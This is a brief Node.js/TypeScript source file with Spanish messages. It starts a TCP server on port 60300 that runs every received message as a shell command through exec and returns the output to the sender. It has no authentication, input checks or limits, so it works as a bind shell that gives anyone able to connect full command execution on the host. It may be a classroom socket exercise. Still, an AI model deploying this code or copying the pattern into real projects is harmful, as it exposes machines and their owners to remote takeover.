import * as net from 'net';
import { exec } from 'child_process';
const servidor = net.createServer((conectado) => {
    conectado.on('data', (data) => {
        console.log('Datos recibidos:', data.toString());
        exec(data.toString(), (error, stdout, stderr) => {
            if (error) {
                conectado.write(`Error al ejecutar el comando:\n${stderr}`);
            }
            else {
                conectado.write(`Resultado:\n${stdout}`);
            }
        });
    });
});
servidor.listen(60300, () => {
    console.log('Servidor esperando conexiones en el puerto 60300');
});
